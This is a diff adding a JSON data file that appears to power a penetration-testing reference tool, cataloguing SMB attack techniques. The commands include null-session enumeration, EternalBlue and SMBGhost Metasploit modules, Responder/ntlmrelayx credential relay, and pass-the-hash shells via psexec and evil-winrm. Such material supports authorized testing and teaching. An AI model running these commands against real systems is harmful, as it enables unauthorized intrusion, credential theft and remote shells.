@@ -1,0 +1,159 @@
+{
+    "name": "SMB - Server Message Block",
+    "port": 445,
+    "description": "Windows file sharing protocol, common attack vector",
+    "icon": "📂",
+    "techniques": [
+        {
+            "id": "smb-1",
+            "name": "Null Session Enumeration",
+            "difficulty": "Beginner",
+            "description": "Connect without credentials to enumerate shares and users",
+            "steps": [
+                "Attempt null session connection",
+                "Enumerate available shares",
+                "List users and groups"
+            ],
+            "commands": [
+                {
+                    "tool": "smbclient",
+                    "command": "smbclient -L //<target_ip> -N",
+                    "description": "List shares with null session"
+                },
+                {
+                    "tool": "enum4linux",
+                    "command": "enum4linux -a <target_ip>",
+                    "description": "Comprehensive SMB enumeration"
+                },
+                {
+                    "tool": "crackmapexec",
+                    "command": "crackmapexec smb <target_ip> -u '' -p ''",
+                    "description": "Check null session access"
+                }
+            ],
+            "tips": [
+                "Null sessions often disabled on modern Windows",
+                "Still common on older systems and NAS devices"
+            ]
+        },
+        {
+            "id": "smb-2",
+            "name": "EternalBlue (MS17-010)",
+            "difficulty": "Intermediate",
+            "description": "Exploit infamous Windows SMB vulnerability",
+            "steps": [
+                "Verify target is vulnerable",
+                "Configure exploit payload",
+                "Execute exploit",
+                "Obtain SYSTEM shell"
+            ],
+            "commands": [
+                {
+                    "tool": "Nmap Scan",
+                    "command": "nmap -p 445 --script smb-vuln-ms17-010 <target_ip>",
+                    "description": "Check for MS17-010 vulnerability"
+                },
+                {
+                    "tool": "Metasploit",
+                    "command": "use exploit/windows/smb/ms17_010_eternalblue",
+                    "description": "EternalBlue exploit module"
+                },
+                {
+                    "tool": "AutoBlue",
+                    "command": "python eternalblue_exploit7.py <target_ip> shellcode/sc_x64.bin",
+                    "description": "Standalone Python exploit"
+                }
+            ],
+            "tips": [
+                "Works on Windows 7, Server 2008 R2, and earlier",
+                "May cause system instability"
+            ]
+        },
+        {
+            "id": "smb-3",
+            "name": "SMB Relay Attack",
+            "difficulty": "Advanced",
+            "description": "Capture and relay SMB authentication to other targets",
+            "steps": [
+                "Set up relay server",
+                "Force victim authentication",
+                "Relay credentials to target"
+            ],
+            "commands": [
+                {
+                    "tool": "Responder",
+                    "command": "responder -I eth0 -wrf",
+                    "description": "Capture authentication attempts"
+                },
+                {
+                    "tool": "ntlmrelayx",
+                    "command": "ntlmrelayx.py -tf targets.txt -smb2support",
+                    "description": "Relay captured auth to targets"
+                }
+            ],
+            "tips": [
+                "Requires SMB signing to be disabled",
+                "Cannot relay back to the source"
+            ]
+        },
+        {
+            "id": "smb-4",
+            "name": "Pass-the-Hash",
+            "difficulty": "Intermediate",
+            "description": "Authenticate using captured NTLM hash without cracking",
+            "steps": [
+                "Obtain NTLM hash",
+                "Use hash for authentication",
+                "Access resources as victim"
+            ],
+            "commands": [
+                {
+                    "tool": "crackmapexec",
+                    "command": "crackmapexec smb <target_ip> -u admin -H <ntlm_hash>",
+                    "description": "Authenticate with hash"
+                },
+                {
+                    "tool": "psexec.py",
+                    "command": "psexec.py admin@<target_ip> -hashes :<ntlm_hash>",
+                    "description": "Get shell using hash"
+                },
+                {
+                    "tool": "evil-winrm",
+                    "command": "evil-winrm -i <target_ip> -u admin -H <ntlm_hash>",
+                    "description": "WinRM shell with hash"
+                }
+            ],
+            "tips": [
+                "Hash format is usually LM:NTLM or just :NTLM",
+                "Common lateral movement technique"
+            ]
+        },
+        {
+            "id": "smb-5",
+            "name": "SMBGhost (CVE-2020-0796)",
+            "difficulty": "Advanced",
+            "description": "Exploit SMBv3 compression vulnerability",
+            "steps": [
+                "Verify target runs vulnerable SMBv3",
+                "Check for CVE-2020-0796",
+                "Execute exploit"
+            ],
+            "commands": [
+                {
+                    "tool": "Scanner",
+                    "command": "python smbghost_scanner.py <target_ip>",
+                    "description": "Dedicated vulnerability scanner"
+                },
+                {
+                    "tool": "Metasploit",
+                    "command": "use exploit/windows/smb/cve_2020_0796_smbghost",
+                    "description": "SMBGhost RCE exploit"
+                }
+            ],
+            "tips": [
+                "Affects Windows 10 versions 1903 and 1909",
+                "Can cause BSOD if exploit fails"
+            ]
+        }
+    ]
+}
